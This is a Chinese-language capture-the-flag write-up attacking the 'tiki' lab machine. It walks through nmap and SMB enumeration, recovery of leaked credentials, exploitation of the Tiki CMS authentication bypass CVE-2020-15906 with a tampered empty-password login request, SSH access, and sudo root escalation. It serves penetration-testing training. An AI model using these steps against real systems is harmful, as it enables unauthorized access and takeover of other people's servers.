# 前言

靶机：`tiki`靶机，IP地址为`192.168.10.8`

攻击：`kali`，IP地址为`192.168.10.6`

靶机采用`virtualbox`，攻击机采用`VMware`虚拟机，都采用桥接网卡模式

> 文章涉及的靶机及工具，都可以自行访问官网或者项目地址进行获取，或者通过网盘链接下载  `https://pan.quark.cn/s/65ab64028b16`

# 主机发现

也就是相当于现实环境中去发现确定主机的`ip`地址，因为这里是靶机环境，所以跳过了从域名到`ip`地址的过程。

使用`arp-scan -l`或者`netdiscovery -r 192.168.10.1/24`

当然也可以使用`nmap`等工具进行

```shell
arp-scan -l
```

![](./pic/1.jpg)

# 信息收集

## 使用nmap扫描目标端口等信息

首先扫描目标的`tcp`端口的开放情况

```shell
nmap -sT --min-rate=1000 192.168.10.8 -p- -oA nmap-tcp
```

![](./pic/2.jpg)

再扫描`udp`端口的开放情况

```shell
nmap -sU --min-rate=1000 192.168.10.8 --top-ports 20 -oA nmap-udp
```

![](./pic/3.jpg)

可以看到明确开放的`udp`端口没有，所以下面对`tcp`端口进行一个筛选

```shell
ports=`grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','`
```

![](./pic/4.jpg)

进一步对这些端口进行服务、系统等探测

```shell
nmap -sV -O -sC 192.168.10.8 -p $ports --min-rate=1000 -oA detail
```

![](./pic/5.jpg)

![](./pic/6.jpg)

再使用`nmap`的漏洞检测脚本对这些端口进行探测

```shell
nmap --script=vuln 192.168.10.8 -p $ports -oA vuln
```

![](./pic/7.jpg)

## SMB探测

使用`enum4linux`枚举用户等信息

```shell
enum4linux 192.168.10.8 -a
```

![](./pic/8.jpg)

![](./pic/9.jpg)

也可以直接使用`smbclient`探测多少分享

```shell
smbclient -L //192.168.10.8 -N
```

![](./pic/10.jpg)

使用`smbclient`连接目标的`Notes`，以无密码连接，发现`Mail.txt`

```shell
smbclient //192.168.10.8/Notes -N

smb: >\ prompt	#关闭交互	
smb: >\ recurse	#开启递归
smb: \> mget *	#下载所有
```

![](./pic/11.jpg)

查看这个文件

![](./pic/12.jpg)

从中可以知道，用户名`silky`和密码`51lky571k1`

## 网站信息探测

访问80端口界面，是`apache`安装后的默认界面

![](./pic/13.jpg)

之前`nmap`扫描出了一个目录`/tiki`，不过这里还是使用相关的工具再次进行目录爆破

```shell
gobuster dir -u http://192.168.10.8 -w /usr/share/wordlists/dirb/big.txt -b 404 -x php,html,txt,md
```

![](./pic/14.jpg)

访问`robots.txt`，可以发现一个目录`/tiki`

![](./pic/15.jpg)

访问这个目录，可以看到有登录框，结合前面获取的用户名和密码，可能就是CMS的用户名和密码

![](./pic/16.jpg)

先不登录，使用`whatweb`或浏览器插件`wappalyzer`查看配置

```shell
whatweb http://192.168.10.8/tiki -v
```

![](./pic/17.jpg)

以用户名`silky`和密码`51lky571k1`登录成功



登录后进行网站测试，在列表文件发现一个文章，点击后，发现说是有这些东西

![](./pic/18.jpg)

再点击`history`进行查看，看到由`admin`编写的，并且在版本2的查看时，发现具体的`cve`编号了`CVE-2020-15906`![](./pic/19.jpg)

使用浏览器搜索对应的`cve`编号，可以发现描述

![](./pic/20.jpg)

从这个描述可以得知，目标靶机的CMS版本应该是在21.2之前的

# CVE-2020-15906漏洞利用

使用`searchsploit`搜索适应的漏洞，当然，其实在`github`上等都要该漏洞的利用

![](./pic/21.jpg)

第二个版本比较符号，就是绕过身份认证，查看这个`py`脚本

![](./pic/22.jpg)

所以说，就是要多次爆破，也就是多次请求，以错误的`admin`的密码测试

直到`Account requires administrator approval.`出现在界面，说明可以以空密码登录`admin`了

这里可以借助这个脚本，或者使用`burp`等工具爆破都行，不过最后都使用`burp`抓取数据包然后进行修改，把`pass`的值改为空即可，大概如下

```shell
ticket=GiLYjkmMUPV0sXO6HYzPpkCfi0AFtto9veYSuW2MiBs&user=admin+&pass=+&login=&stay_in_ssl_mode_present=y&stay_in_ssl_mode=n
```

![](./pic/23.jpg)

当抓取后，修改再转发，这里是为了截图，所以找的`burp`的代理历史记录。

转发后即可发现以`admin`的身份登录成功了

![](./pic/24.jpg)

按照之前还是点击查看，发现一个文件名称很是吸引

![](./pic/25.jpg)

点击`credentials`发现了一组凭据，是`silky`的。`silky:Agy8Y7SPJNXQzqA`

![](./pic/26.jpg)

当然这里我也测试了很多功能点，发现了文件上传，但是上传的`php`文件，无法解析为`php`文件，而是直接下载，所以这个凭据应该就是`ssh`连接

```shell
ssh silky@192.168.10.8
```

![](./pic/27.jpg)



# 提权

这里先说明，对于靶机内的信息收集，我做了省略，因为这里`sudo -l`可以直接提权了，所以一些步骤就不写了，但是要知道哦。

登录后，对于靶机，我直接搜集SUID权限的文件

```shell
find / -perm -4000 -print 2>/dev/null
```

![](./pic/28.jpg)

发现`sudo`，尝试`sudo -l`，也知道用户`silky`的密码，所以直接就能测试出，发现所有的命令都可以提权。

```shell
sudo -l
```

![](./pic/29.jpg)

直接进行提权

```shell
sudo /bin/bash -p
```

![](./pic/30.jpg)

查看最终`flag`

```shell
cd /root
cat flag.txt
```

![](./pic/31.jpg)

# 总结

该靶机从头到尾的重点就是`CVE-2020-15906`漏洞，就是`tiki`的CMS漏洞。构造路线如下：

SMB服务---->网站信息获取---->CVE漏洞利用---->获取ssh凭证---->sduo提权